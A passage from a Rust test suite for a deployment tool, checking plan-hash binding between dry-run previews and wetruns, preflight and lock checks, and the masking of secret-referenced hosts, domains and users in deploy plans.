        assert_eq!(dry.outcome, DeployOutcome::DryRun);
        hashes.push(dry.plan_hash);
    }
    assert_eq!(
        rig.previews_on_disk(),
        ["a.example.com.json", "b.example.com.json"]
    );
    for (host, hash) in ["a.example.com", "b.example.com"].iter().zip(&hashes) {
        let preview = read_deploy_preview(rig.home.path(), &rig.config_path, host).unwrap();
        assert_eq!(&preview.plan_hash, hash);
        assert_eq!(&preview.host, host);
    }
}

/// One preview binds one wetrun. Whichever way a wetrun bound, it withdraws the
/// record before its steps; a wetrun that bound to the record and finds it gone was
/// beaten to it by another run, and stops. So does one that finds a later preview of
/// another plan there, which it leaves in place.
#[test]
fn a_preview_another_run_withdrew_stops_the_wetrun_that_bound_to_it() {
    use super::{Binding, spend_preview};
    use crate::deploy_preview::{new_deploy_preview, write_deploy_preview};
    use crate::error::{Error, Previewed};
    use zap_types::deploy_preview::DeployPreviewPass;

    let home = tempfile::tempdir().unwrap();
    let config_path = home.path().join("zap.ts");
    let record = |hash: &str| {
        let preview = new_deploy_preview(DeployPreviewPass::DryRun, HOST, hash);
        write_deploy_preview(home.path(), &config_path, &preview).unwrap();
    };
    let spend = |binding| spend_preview(Some(home.path()), &config_path, HOST, "abc", binding);
    let recorded = || {
        crate::deploy_preview::read_deploy_preview(home.path(), &config_path, HOST)
            .map(|preview| preview.plan_hash)
    };

    // Two runs read one preview: the first to withdraw it runs, the second stops.
    record("abc");
    spend(Binding::Recorded).unwrap();
    assert_eq!(recorded(), None);
    let second = spend(Binding::Recorded).unwrap_err();
    assert!(
        matches!(
            second,
            Error::PreviewSpent {
                of: Previewed::Deploy
            }
        ),
        "{second:?}"
    );
    assert_eq!(second.exit_code(), 2);
    assert_eq!(
        second.to_string(),
        "the deploy preview this wetrun bound to was withdrawn or replaced by another \
         run before this one's first step — this run deployed nothing; preview again \
         with `zap deploy`, or pass --expect-plan"
    );

    // A preview of another plan recorded since this run read its own is no review of
    // this plan: the run stops, and the record stays for the wetrun it binds.
    record("def");
    assert!(matches!(
        spend(Binding::Recorded),
        Err(Error::PreviewSpent { .. })
    ));
    assert_eq!(recorded().as_deref(), Some("def"));

    // `--expect-plan` bound to no record: none there is nothing lost, and one there
    // is spent all the same.
    std::fs::remove_file(crate::home::deploy_preview_path_for(
        home.path(),
        &config_path,
        HOST,
    ))
    .unwrap();
    spend(Binding::Expected).unwrap();
    record("def");
    spend(Binding::Expected).unwrap();
    assert_eq!(recorded(), None);
    // With no state directory there is no record to have bound to.
    spend_preview(None, &config_path, HOST, "abc", Binding::Expected).unwrap();
}

/// A health domain that resolves through a secret name and a host whose value
/// carries a secret are each told their own way out, in one message.
#[tokio::test]
async fn each_masked_reference_is_told_its_own_way_out() {
    let _env = crate::resolve::test_env::set(&[
        ("ZAP_T_DEPLOY_HOST", "db-hunter2hunter2"),
        ("ZAP_T_DOMAIN_KEY", "hidden.example.com"),
    ]);
    let mut registry = crate::secret::SecretRegistry::new();
    registry.register("ZAP_T_DB_PASSWORD", "hunter2hunter2");
    let mut rig =
        Rig::on(&Text::reference("ZAP_T_DEPLOY_HOST"), "def5678").with_deploy(serde_json::json!({
            "artifacts": ["build/"], "path": "/srv/app",
            "health": {"domain": Text::reference("ZAP_T_DOMAIN_KEY"), "path": "/health"},
        }));
    rig.masker = registry.freeze().unwrap();
    let result = rig.deploy(&wetrun()).await;
    let Err(crate::error::Error::WetrunRefused(message)) = result else {
        panic!("{result:?}");
    };
    assert_eq!(
        message,
        format!(
            "a deploy wetrun needs a plan that names one machine — nothing ran: the target \
         host `{zap_t_deploy_host}` references `{zap_t_deploy_host}`, whose value \
         carries the secret `{zap_t_db_password}` (a target host must not hold a \
         secret's value: declare it literally, or through a variable that carries none); \
         the health domain `{zap_t_domain_key}` references `{zap_t_domain_key}`, a \
         secret name (call `zap.unmask('ZAP_T_DOMAIN_KEY')` if it is not a secret, or \
         declare the value literally); the plan holds a masking token in its place, so \
         it names no one machine and its hash is the same for every value the reference \
         takes",
            zap_t_deploy_host = shown("ZAP_T_DEPLOY_HOST"),
            zap_t_db_password = shown("ZAP_T_DB_PASSWORD"),
            zap_t_domain_key = shown("ZAP_T_DOMAIN_KEY")
        )
    );
}

/// A refusal that couldn't be recorded offers the hash and nothing else, whichever
/// way the wetrun tried to bind: a bare re-run would have no preview to bind to.
#[test]
fn an_unrecorded_refusal_offers_only_the_hash() {
    for outcome in [
        refused("stale"),
        DeployOutcome::Refused(PlanUnreviewed::NoPreview { prior: None }),
    ] {
        let rendered = render_deploy(&DeployReport {
            recorded: None,
            ..report(outcome.clone(), vec![])
        });
        assert!(
            rendered.ends_with(
                "  review the plan above, then re-run with --expect-plan deadbeef\n\
                 plan_hash: deadbeef\n"
            ),
            "{outcome:?}: {rendered}"
        );
        assert!(!rendered.contains("binds to this preview"), "{outcome:?}");
    }
}

/// A wetrun whose preflight bails on a pin the ledger doesn't answer for says so:
/// the report carries the lock's standing and the render leads the held resource
/// with the `LOCK —` block that names the fix.
#[tokio::test]
async fn a_wetrun_bailing_on_a_withheld_pin_renders_the_lock_standing() {
    use zap_types::lock::{LockEntry, ZapLock};
    use zap_types::scalar::ContentHash;
    use zap_types::schema::ResourceId;

    let mut rig = Rig::new("def5678");
    rig.config.resources = vec![
        serde_json::from_value(serde_json::json!({
            "id": "blob", "type": "file", "path": "/opt/blob",
            "content": {"type": "remote", "url": "https://files.example/blob",
                        "extract": {"type": "none"}},
        }))
        .unwrap(),
    ];
    let lock = ZapLock {
        entries: [(
            ResourceId("blob".to_owned()),
            LockEntry::RemoteFile {
                config_hash: "not-this-config".to_owned(),
                blake3: ContentHash::new("a".repeat(64)).unwrap(),
            },
        )]
        .into(),
        ..ZapLock::default()
    };
    crate::lock::write_zap_lock(&crate::lock::lock_path_for(&rig.config_path), &lock).unwrap();
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert_eq!(dry.lock_standing.stale, ["blob"]);
    // A refusal is a preview too: it shows the block under the plan it rendered.
    let refused = rig.deploy(&wetrun_expecting("not-the-plan")).await.unwrap();
    assert!(matches!(refused.outcome, DeployOutcome::Refused(_)));
    assert_eq!(refused.lock_standing.stale, ["blob"]);
    assert!(
        render_deploy(&refused).contains(
            "  LOCK — the pin ledger does not answer for 1 resource(s), so the drift \
             preflight cannot check them and a wetrun stops there:\n      blob — stale: "
        ),
        "{}",
        render_deploy(&refused)
    );
    let wet = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::PreflightUndetermined, "{wet:?}");
    assert_eq!(wet.lock_standing.stale, ["blob"]);
    let rendered = render_deploy(&wet);
    assert!(
        rendered.contains("      blob — stale: the config changed since the pin was minted"),
        "{rendered}"
    );
}

/// The gate says what the wetrun bound to, and only a record it read makes that
/// [`Binding::Recorded`](super::Binding::Recorded): `--expect-plan` binds as
/// `Expected` whatever is recorded, and a refusal binds to nothing.
#[test]
fn the_gate_returns_what_the_wetrun_bound_to() {
    use super::{Binding, review_gate};
    use crate::deploy_preview::{new_deploy_preview, write_deploy_preview};
    use zap_types::deploy_preview::DeployPreviewPass;

    let home = tempfile::tempdir().unwrap();
    let config_path = home.path().join("zap.ts");
    let gate = |home, expected| review_gate(home, &config_path, HOST, "abc", expected);
    assert_eq!(
        gate(Some(home.path()), None),
        Err(PlanUnreviewed::NoPreview { prior: None })
    );
    assert_eq!(gate(Some(home.path()), Some("abc")), Ok(Binding::Expected));
    let preview = new_deploy_preview(DeployPreviewPass::DryRun, HOST, "abc");
    write_deploy_preview(home.path(), &config_path, &preview).unwrap();
    assert_eq!(gate(Some(home.path()), None), Ok(Binding::Recorded));
    assert_eq!(gate(Some(home.path()), Some("abc")), Ok(Binding::Expected));
    assert!(matches!(
        gate(Some(home.path()), Some("other")),
        Err(PlanUnreviewed::Expected { .. })
    ));
    // With no state directory nothing is read, so nothing binds by record.
    assert_eq!(
        gate(None, None),
        Err(PlanUnreviewed::NoPreview { prior: None })
    );
}

/// A target already serving this version short-circuits ahead of the binding: nothing
/// would run, so there is nothing to review, whatever hash was expected.
#[tokio::test]
async fn an_already_deployed_target_short_circuits_ahead_of_the_binding() {
    let rig = Rig::new("abc1234");
    let report = rig.deploy(&wetrun_expecting("not-the-plan")).await.unwrap();
    assert_eq!(report.outcome, DeployOutcome::AlreadyDeployed);
    assert_eq!(report.exit_code(), 0);
    assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());
    assert!(
        render_deploy(&report).starts_with(&format!("deploy — target {HOST} (wetrun)\n")),
        "{}",
        render_deploy(&report)
    );
}

/// A dry run against a target already at this version shows no steps, so it prints
/// no hash to bind to. The `--force` dry run shows the redeploy and its hash, and the
/// forced wetrun expecting that hash deploys.
#[tokio::test]
async fn a_redeploy_binds_to_the_forced_dry_run_that_showed_it() {
    let force = DeployOptions {
        force: true,
        ..DeployOptions::default()
    };
    let plain = Rig::new("abc1234")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    assert_eq!(plain.outcome, DeployOutcome::AlreadyDeployed);
    let rendered = render_deploy(&plain);
    assert!(!rendered.contains("plan_hash"), "{rendered}");
    assert!(!rendered.contains("(tarball)"), "{rendered}");

    let dry = Rig::new("abc1234").deploy(&force).await.unwrap();
    assert_eq!(dry.outcome, DeployOutcome::DryRun);
    let rendered = render_deploy(&dry);
    assert!(
        rendered.contains("  - Create tarball (tarball)"),
        "{rendered}"
    );
    assert!(
        rendered.ends_with(&format!("plan_hash: {}\n", dry.plan_hash)),
        "{rendered}"
    );

    let rig = Rig::new("abc1234").recording(&dry.plan);
    let wet = rig
        .deploy(&DeployOptions {
            force: true,
            ..wetrun_expecting(&dry.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
}

/// A `current` naming this version's release, which is missing from the host (a
/// `--force` of the live version killed between its renames), is not "already
/// deployed": a plain dry run shows the redeploy and says why, and the wetrun bound to
/// it deploys.
#[tokio::test]
async fn a_current_naming_a_missing_release_is_redeployed_without_force() {
    let missing = |mut rig: Rig| {
        rig.target = rig.target.with(
            "test -d '/srv/app/current'",
            CommandOutput {
                success: false,
                code: 1,
                stdout: String::new(),
                stderr: String::new(),
            },
        );
        rig
    };
    let dry = missing(Rig::new("abc1234"))
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    assert_eq!(dry.outcome, DeployOutcome::DryRun);
    assert!(
        dry.warnings
            .iter()
            .any(|w| w.contains("`current` names releases/abc1234, which is not on the host")),
        "{:?}",
        dry.warnings
    );
    let rendered = render_deploy(&dry);
    assert!(
        rendered.contains("  - Create tarball (tarball)"),
        "{rendered}"
    );

    let rig = missing(Rig::new("abc1234")).recording(&dry.plan);
    let wet = rig.deploy(&wetrun_expecting(&dry.plan_hash)).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
}

/// The plan is for one host: the same release reviewed against one target doesn't
/// bind a wetrun on another, whether the two are two declarations or one reference
/// declaration under two environments.
#[tokio::test]
async fn a_plan_reviewed_for_one_host_does_not_bind_a_wetrun_on_another() {
    let reviewed = Rig::new("def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    assert_eq!(reviewed.plan.host, HOST);

    let other = Rig::on(&Text::literal("other.example.com"), "def5678");
    let rig = Rig::on(&Text::literal("other.example.com"), "def5678")
        .recording(&other.deploy(&DeployOptions::default()).await.unwrap().plan);
    let report = rig
        .deploy(&wetrun_expecting(&reviewed.plan_hash))
        .await
        .unwrap();
    assert_eq!(report.outcome, refused(&reviewed.plan_hash));
    assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());

    // One declaration, two environments: the declared target is the same text, so
    // only the resolved host tells the plans apart.
    let mut hashes = Vec::new();
    for host in ["a.example.com", "b.example.com"] {
        let _env = crate::resolve::test_env::set(&[("ZAP_T_DEPLOY_HOST", host)]);
        let dry = Rig::on(&Text::reference("ZAP_T_DEPLOY_HOST"), "def5678")
            .deploy(&DeployOptions::default())
            .await
            .unwrap();
        assert_eq!(dry.plan.host, host);
        assert_eq!(
            dry.plan.target.host().map(Text::as_inert),
            Some(marker("ZAP_T_DEPLOY_HOST").as_str())
        );
        hashes.push(dry.plan_hash);
    }
    assert_ne!(hashes[0], hashes[1]);
}

/// `--skip-build` is part of the plan: the preview has no build step, its hash isn't
/// the with-build plan's, and a wetrun of either binds only to its own preview — the
/// skipped build is never issued.
#[tokio::test]
async fn skipping_the_build_is_a_different_plan() {
    let skip = DeployOptions {
        skip_build: true,
        ..DeployOptions::default()
    };
    let built = Rig::new("def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    let skipped = Rig::new("def5678").deploy(&skip).await.unwrap();
    assert!(render_deploy(&built).contains("  - Build application (build)"));
    assert!(!render_deploy(&skipped).contains("(build)"));
    assert_ne!(built.plan_hash, skipped.plan_hash);

    // The review of the full plan doesn't bind a wetrun that skips the build.
    let rig = Rig::new("def5678").recording(&built.plan);
    let report = rig
        .deploy(&DeployOptions {
            skip_build: true,
            ..wetrun_expecting(&built.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(report.outcome, refused(&built.plan_hash));

    let report = rig
        .deploy(&DeployOptions {
            skip_build: true,
            ..wetrun_expecting(&skipped.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(report.outcome, DeployOutcome::Deployed, "{report:?}");
    assert!(!rig.local.issued("make"));
    assert!(
        report
            .step_outcomes
            .iter()
            .all(|outcome| matches!(outcome, StepOutcome::Completed { .. })),
        "{:?}",
        report.step_outcomes
    );
}

/// A wetrun that bails at the drift preflight is headed as the wetrun it was, and
/// prints no hash for the steps it never showed.
#[tokio::test]
async fn a_wetrun_stopped_at_the_preflight_reads_as_a_wetrun() {
    let mut rig = Rig::new("def5678");
    // No recorded answer for the directory: the preflight can't read it.
    rig.target = MockConnection::new(HOST).with_user("deploy").with(
        "if [ -L '/srv/app/current' ]; then readlink -- '/srv/app/current'; elif [ -e '/srv/app/current' ]; then exit 4; else exit 3; fi",
        ok("/srv/app/releases/def5678\n"),
    );
    rig.deploy(&DeployOptions::default()).await.unwrap();
    let report = rig.deploy(&wetrun()).await.unwrap();
    assert_eq!(report.outcome, DeployOutcome::PreflightUndetermined);
    let rendered = render_deploy(&report);
    assert!(
        rendered.starts_with(&format!("deploy — target {HOST} (wetrun)\n")),
        "{rendered}"
    );
    assert!(!rendered.contains("plan_hash"), "{rendered}");
}

/// `--expect-plan` binds a wetrun; a dry run given one is rejected before the config
/// is read (the path names no file) rather than previewing as if it were bound.
#[tokio::test]
async fn expect_plan_on_a_dry_run_is_rejected_before_any_io() {
    let result = super::run_deploy_in(
        None,
        None,
        Path::new("/nonexistent/zap.ts"),
        &DeployOptions {
            expect_plan: Some("abc".to_owned()),
            ..DeployOptions::default()
        },
    )
    .await;
    let Err(error @ crate::error::Error::ExpectPlanWithoutWetrun) = result else {
        panic!("a dry run must reject --expect-plan: {result:?}");
    };
    assert_eq!(error.exit_code(), 2);
    assert_eq!(
        error.render(),
        "error: --expect-plan binds a wetrun to a reviewed plan; a dry run only previews \
         (add --wetrun)\n"
    );
}

/// A host reference the config's secret rule names is its masking token in the plan:
/// the value it resolves to is in neither the plan nor the render. Such a plan names
/// no one machine: the dry run shows it, says why no wetrun of it runs, prints no
/// `plan_hash`, and records no preview.
#[tokio::test]
async fn a_secret_named_host_is_its_token_in_a_plan_with_no_hash() {
    let _env = crate::resolve::test_env::set(&[("ZAP_T_HOST_TOKEN", "hidden.example.com")]);
    let rig = Rig::on(&Text::reference("ZAP_T_HOST_TOKEN"), "def5678");
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert_eq!(dry.plan.host, "[MASKED:ZAP_T_HOST_TOKEN]");
    assert!(
        matches!(dry.outcome, DeployOutcome::DryRunUnbindable(_)),
        "{:?}",
        dry.outcome
    );
    assert_eq!(dry.exit_code(), 0);
    let plan = serde_json::to_string(&dry.plan).unwrap();
    assert!(!plan.contains("hidden.example.com"), "{plan}");
    let rendered = render_deploy(&dry);
    assert!(!rendered.contains("hidden.example.com"), "{rendered}");
    assert!(!rendered.contains("plan_hash:"), "{rendered}");
    assert!(!rendered.contains(&dry.plan_hash), "{rendered}");
    assert!(rendered.contains("  host: [MASKED:ZAP_T_HOST_TOKEN]\n"));
    assert!(
        rendered.contains("  - Create tarball (tarball)"),
        "{rendered}"
    );
    assert!(
        rendered.ends_with(&format!(
            "  (dry-run — a wetrun of this config is refused, so this plan has no \
             plan_hash and is not recorded as a preview)\n  UNBINDABLE — the target host \
             `{zap_t_host_token}` references `{zap_t_host_token}`, a secret name (call \
             `zap.unmask('ZAP_T_HOST_TOKEN')` if it is not a secret, or declare the value \
             literally); the plan holds a masking token in its place, so it names no one \
             machine and its hash is the same for every value the reference takes\n",
            zap_t_host_token = shown("ZAP_T_HOST_TOKEN")
        )),
        "{rendered}"
    );
    assert!(dry.warnings.is_empty(), "{:?}", dry.warnings);
    // Nothing is filed: not under the token, not under anything.
    assert_eq!(rig.previews_on_disk(), Vec::<String>::new());
}

/// A connecting user that resolves through a secret name makes the plan unbindable
/// like a masked host does: the plan carries the user by value (it is part of the
/// uploaded archive's name), so a hash of it would be a function of the secret. The wetrun is
/// refused before anything runs, and the dry run shows the plan — the user masked —
/// with no `plan_hash` and no preview recorded.
#[tokio::test]
async fn a_masked_connecting_user_is_unbindable_too() {
    let _env = crate::resolve::test_env::set(&[("ZAP_T_USER_TOKEN", "hiddenuser")]);
    let mut registry = crate::secret::SecretRegistry::new();
    registry.register("ZAP_T_USER_TOKEN", "hiddenuser");
    let mut rig = Rig::new("def5678");
    rig.config.target = serde_json::from_value(serde_json::json!({
        "host": HOST, "user": Text::reference("ZAP_T_USER_TOKEN"),
    }))
    .unwrap();
    rig.target = rig.target.with_user("hiddenuser");
    rig.masker = registry.freeze().unwrap();

    let result = rig.deploy(&wetrun()).await;
    let Err(crate::error::Error::WetrunRefused(message)) = result else {
        panic!("a masked connecting user must not deploy: {result:?}");
    };
    assert_eq!(
        message,
        format!(
            "a deploy wetrun needs a plan that names one machine — nothing ran: the \
         connecting user `{zap_t_user_token}` references `{zap_t_user_token}`, a \
         secret name (call `zap.unmask('ZAP_T_USER_TOKEN')` if it is not a secret, or \
         declare the value literally); the plan carries the connecting user by value, \
         so its hash would be a function of that secret",
            zap_t_user_token = shown("ZAP_T_USER_TOKEN")
        )
    );

    // With a masked host too, each reference closes with its own reason.
    let _host = crate::resolve::test_env::set(&[("ZAP_T_HOST_TOKEN", "hidden.example.com")]);
    rig.config.target = serde_json::from_value(serde_json::json!({
        "host": Text::reference("ZAP_T_HOST_TOKEN"),
        "user": Text::reference("ZAP_T_USER_TOKEN"),
    }))
    .unwrap();
    let result = rig.deploy(&wetrun()).await;
    let Err(crate::error::Error::WetrunRefused(message)) = result else {
        panic!("{result:?}");
    };
    assert_eq!(
        message,
        format!(
            "a deploy wetrun needs a plan that names one machine — nothing ran: the target \
         host `{zap_t_host_token}` references `{zap_t_host_token}`, a secret name \
         (call `zap.unmask('ZAP_T_HOST_TOKEN')` if it is not a secret, or declare the \
         value literally); the plan holds a masking token in its place, so it names no \
         one machine and its hash is the same for every value the reference takes; the \
         connecting user `{zap_t_user_token}` references `{zap_t_user_token}`, a \
         secret name (call `zap.unmask('ZAP_T_USER_TOKEN')` if it is not a secret, or \
         declare the value literally); the plan carries the connecting user by value, \
         so its hash would be a function of that secret",
            zap_t_host_token = shown("ZAP_T_HOST_TOKEN"),
            zap_t_user_token = shown("ZAP_T_USER_TOKEN")
        )
    );
    rig.config.target = serde_json::from_value(serde_json::json!({
        "host": HOST, "user": Text::reference("ZAP_T_USER_TOKEN"),
    }))
    .unwrap();
    assert_eq!(rig.local.issued_commands(), Vec::<String>::new());
    assert_eq!(rig.target.issued_commands(), Vec::<String>::new());

    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert!(
        matches!(dry.outcome, DeployOutcome::DryRunUnbindable(_)),
        "{:?}",
        dry.outcome
    );
    let rendered = render_deploy(&dry);
    assert!(!rendered.contains("plan_hash:"), "{rendered}");
    assert!(!rendered.contains(&dry.plan_hash), "{rendered}");
    assert!(!rendered.contains("hiddenuser"), "{rendered}");
    assert!(
        rendered.contains("/srv/app/.zap-deploy-[MASKED:ZAP_T_USER_TOKEN]-abc1234.tar.gz"),
        "{rendered}"
    );
    assert!(
        rendered.contains(&format!(
            "  UNBINDABLE — the connecting user `{zap_t_user_token}` ",
            zap_t_user_token = shown("ZAP_T_USER_TOKEN")
        )),
        "{rendered}"
    );
    assert_eq!(rig.previews_on_disk(), Vec::<String>::new());
}

/// The user deploy's unbindable check reads is the one the run connects as: under
/// `--bootstrap` a secret `bootstrap_user` makes the plan unbindable though the
/// primary `user` is plain, and a secret primary `user` doesn't.
#[tokio::test]
async fn the_deploy_unbindable_check_reads_the_user_the_run_connects_as() {
    let _env = crate::resolve::test_env::set(&[("ZAP_T_USER_TOKEN", "hiddenuser")]);
    let dry_as_bootstrap = |target: serde_json::Value, connects_as: &'static str| async move {
        let mut rig = Rig::new("def5678");
        rig.config.target = serde_json::from_value(target).unwrap();
        rig.target = rig.target.with_user(connects_as);
        let ctx = crate::commands::PassContext {
            zap_home: Some(rig.home.path()),
            config_path: &rig.config_path,
            masker: &rig.masker,
            bootstrap: true,
        };
        super::deploy_over(
            &Connection::Mock(rig.local.clone()),
            &Connection::Mock(rig.target.clone()),
            &rig.config,
            ctx,
            &DeployOptions::default(),
            &rig.scratch(),
        )
        .await
        .unwrap()
        .outcome
    };

    let outcome = dry_as_bootstrap(
        serde_json::json!({
            "host": HOST, "user": "deploy",
            "bootstrap_user": Text::reference("ZAP_T_USER_TOKEN"),
        }),
        "hiddenuser",
    )
    .await;
    assert!(
        matches!(&outcome, DeployOutcome::DryRunUnbindable(reason)
            if reason.starts_with(&format!("the connecting user `{zap_t_user_token}` references ", zap_t_user_token = shown("ZAP_T_USER_TOKEN")))),
        "{outcome:?}"
    );

    let outcome = dry_as_bootstrap(
        serde_json::json!({
            "host": HOST, "user": Text::reference("ZAP_T_USER_TOKEN"),
            "bootstrap_user": "root",
        }),
        "root",
    )
    .await;
    assert_eq!(outcome, DeployOutcome::DryRun);
}

/// A wetrun of a plan whose host or health domain is masked is rejected before
/// anything runs — no connection, no git read — with or without `--expect-plan`,
/// naming the reference and the way out: its plan would stand for every machine the
/// reference names. A host and a domain that resolve by value bind as usual.
#[tokio::test]
async fn a_wetrun_of_a_plan_that_names_no_one_machine_is_rejected() {
    let _env = crate::resolve::test_env::set(&[
        ("ZAP_T_HOST_TOKEN", "hidden.example.com"),
        ("ZAP_T_DOMAIN_KEY", "hidden.example.com"),
        ("ZAP_T_DOMAIN", "open.example.com"),
    ]);
    let health = |domain: &str| {
        serde_json::json!({
            "artifacts": ["build/"], "path": "/srv/app",
            "health": {"domain": Text::reference(domain), "path": "/health"},
        })
    };
    for options in [wetrun(), wetrun_expecting("any")] {
        for (rig, what, name) in [
            (
                Rig::on(&Text::reference("ZAP_T_HOST_TOKEN"), "def5678"),
                "target host",
                "ZAP_T_HOST_TOKEN",
            ),
            (
                Rig::new("def5678").with_deploy(health("ZAP_T_DOMAIN_KEY")),
                "health domain",
                "ZAP_T_DOMAIN_KEY",
            ),
        ] {
            let result = rig.deploy(&options).await;
            let Err(crate::error::Error::WetrunRefused(message)) = result else {
                panic!("a masked {what} must not deploy: {result:?}");
            };
            assert!(
                message.starts_with(
                    "a deploy wetrun needs a plan that names one machine — nothing ran: "
                ),
                "{message}"
            );
            assert!(message.contains(&format!("the {what} ")), "{message}");
            assert!(message.contains(&format!("`{}`", shown(name))), "{message}");
            assert!(
                message.contains(&format!("`zap.unmask('{name}')`")),
                "{message}"
            );
            assert!(message.contains("declare the value literally"), "{message}");
            assert!(message.contains(", a secret name ("), "{message}");
            assert!(!message.contains("hidden.example.com"), "{message}");
            assert_eq!(crate::error::Error::WetrunRefused(message).exit_code(), 2);
            assert_eq!(rig.local.issued_commands(), Vec::<String>::new());
            assert_eq!(rig.target.issued_commands(), Vec::<String>::new());
            assert_eq!(rig.previews_on_disk(), Vec::<String>::new());
        }
    }

    // A domain resolved by value is in the plan, and binds: the wrong hash is the
    // review's refusal, a report and not an error.
    let rig = Rig::new("def5678").with_deploy(health("ZAP_T_DOMAIN"));
    let report = rig.deploy(&wetrun_expecting("any")).await.unwrap();
    assert_eq!(report.outcome, refused("any"));
    assert!(report.warnings.is_empty(), "{:?}", report.warnings);
}

/// A host that resolves to nothing names no machine, so there is no plan for it: a
/// config error, never a plan filed under an empty host.
#[tokio::test]
async fn a_host_that_resolves_to_nothing_is_a_config_error() {
    let result = Rig::on(&Text::reference("ZAP_T_UNSET_DEPLOY_HOST"), "def5678")
        .deploy(&DeployOptions::default())
        .await;
    let Err(crate::error::Error::Config(message)) = result else {
        panic!("an empty host must not plan: {result:?}");
    };
    assert!(message.contains("resolves to nothing"), "{message}");
}

/// The health endpoint is part of the plan as it resolves: one referenced domain
/// under two environments is two plans, and the preview shows the URL each polls
/// beside the one declared.
#[tokio::test]
async fn a_plan_names_the_endpoint_its_health_gate_polls() {
    let mut hashes = Vec::new();
    for domain in ["a.example.com", "b.example.com"] {
        let _env = crate::resolve::test_env::set(&[("ZAP_T_DOMAIN", domain)]);
        let dry = Rig::new("def5678")
            .with_deploy(serde_json::json!({
                "artifacts": ["build/"], "path": "/srv/app",
                "health": {"domain": Text::reference("ZAP_T_DOMAIN"), "path": "/health"},
            }))
            .deploy(&DeployOptions::default())
            .await
            .unwrap();
        let rendered = render_deploy(&dry);
        assert!(
            rendered.contains(&format!(
                "      GET https://{zap_t_domain}/health — ",
                zap_t_domain = shown("ZAP_T_DOMAIN")
            )),
            "{rendered}"
        );
        // The plan records what the block's reference resolved to, and says so.
        assert_eq!(
            dry.plan
                .references
                .iter()
                .map(|(name, value)| (name.as_str(), value.clone()))
                .collect::<Vec<_>>(),
            [(
                "ZAP_T_DOMAIN",
                zap_types::plan::ReferenceValue::Value(domain.to_owned())
            )]
        );
        assert!(
            rendered.contains(&format!("\n  references:\n    ZAP_T_DOMAIN = {domain}\n")),
            "{rendered}"
        );
        assert!(
            rendered.contains(&format!("      polls https://{domain}/health\n")),
            "{rendered}"
        );
        assert!(
            rendered.contains(&format!("      polls https://{domain}/ready\n")),
            "{rendered}"
        );
        hashes.push(dry.plan_hash);
    }
    assert_ne!(hashes[0], hashes[1]);
}

/// `--skip-preflight` is part of the plan: the preview says the drift check is
/// skipped, and a review made with the preflight on doesn't bind a wetrun that skips
/// it, nor the other way round.
#[tokio::test]
async fn skipping_the_preflight_is_a_different_plan() {
    let skip = DeployOptions {
        skip_preflight: true,
        ..DeployOptions::default()
    };
    let checked = Rig::new("def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    let skipped = Rig::new("def5678").deploy(&skip).await.unwrap();
    assert!(render_deploy(&checked).contains("  preflight: 1 apply-managed resource(s), digest "));
    assert!(render_deploy(&skipped).contains("  preflight: skipped (--skip-preflight)\n"));
    assert_ne!(checked.plan_hash, skipped.plan_hash);

    let rig = Rig::new("def5678").recording(&checked.plan);
    let report = rig
        .deploy(&DeployOptions {
            skip_preflight: true,
            ..wetrun_expecting(&checked.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(report.outcome, refused(&checked.plan_hash));
    let report = rig
        .deploy(&wetrun_expecting(&skipped.plan_hash))
        .await
        .unwrap();
    assert_eq!(report.outcome, refused(&skipped.plan_hash));

    // Bound to its own preview, the skipping wetrun deploys without a detection pass.
    let report = rig
        .deploy(&DeployOptions {
            skip_preflight: true,
            ..wetrun_expecting(&skipped.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(report.outcome, DeployOutcome::Deployed, "{report:?}");
    assert!(rig.target.issued_queries().is_empty());
}

/// The version a forced deploy of a dirty tree takes, over git reads answering
/// `diff`, the untracked names `untracked` (NUL-separated), and `blobs` for their
/// contents.
async fn forced_dirty_version(diff: &str, untracked: &str, blobs: &str) -> String {
    let report = forced_dirty(diff, untracked, blobs).await.unwrap();
    assert!(report.plan.dirty);
    report.version
}

/// A forced deploy of a dirty tree over the git reads [`forced_dirty_version`] names.
async fn forced_dirty(
    diff: &str,
    untracked: &str,
    blobs: &str,
) -> crate::error::Result<DeployReport> {
    let mut rig = Rig::new("def5678");
    rig.local = rig
        .local
        .with(super::checkout::DIRTY_TREE_STATUS, ok(" M src/app.ts\n"))
        .with(super::checkout::DIRTY_TREE_DIFF, ok(diff))
        .with(super::checkout::DIRTY_TREE_UNTRACKED, ok(untracked))
        .with(super::checkout::DIRTY_TREE_BLOBS, ok(blobs));
    rig.deploy(&DeployOptions {
        force: true,
        ..DeployOptions::default()
    })
    .await
}

/// A forced deploy of a dirty tree names its release by what the tree adds to the
/// commit — the same tree the same id, so a dry run and the wetrun bound to it agree —
/// and another tree on the same commit is another release, never extracted over the
/// first.
#[tokio::test]
async fn a_forced_dirty_tree_is_named_by_its_changes() {
    let diff = "diff --git a/src/app.ts b/src/app.ts\n+changed\n";
    let version = forced_dirty_version(diff, "", "").await;
    let id = version.strip_prefix("abc1234-dirty-").unwrap();
    assert_eq!(id.len(), 8, "{version}");
    assert!(
        id.bytes()
            .all(|b| b.is_ascii_hexdigit() && !b.is_ascii_uppercase())
    );
    assert_eq!(forced_dirty_version(diff, "", "").await, version);
    assert_ne!(forced_dirty_version("+other\n", "", "").await, version);
    let untracked = "new file\0b\0";
    let with = forced_dirty_version(diff, untracked, "1111\n2222\n").await;
    assert_ne!(with, version);
    assert_ne!(
        forced_dirty_version(diff, untracked, "1111\n3333\n").await,
        with,
        "an untracked file's contents name the tree too"
    );
    // An untracked nested repository is a `name/` entry with no blob id: it names the
    // tree by its name alone, beside the files that do get one.
